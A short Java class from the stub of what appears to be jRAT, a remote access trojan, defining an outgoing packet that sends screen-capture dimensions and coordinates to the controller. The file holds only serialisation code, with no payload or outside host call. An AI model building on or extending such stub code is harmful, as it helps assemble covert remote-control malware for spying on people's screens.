package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;
import pro.jrat.stub.Connection;


public class Packet17RemoteScreen extends AbstractOutgoingPacket {
	
	private int width;
	private int height;
	private int x;
	private int y;

	public Packet17RemoteScreen(int width, int height, int x, int y) {
		this.width = width;
		this.height = height;
		this.x = x;
		this.y = y;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		
		dos.writeInt(width);
		dos.writeInt(height);
		dos.writeInt(x);
		dos.writeInt(y);
		
		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 17;
	}

}
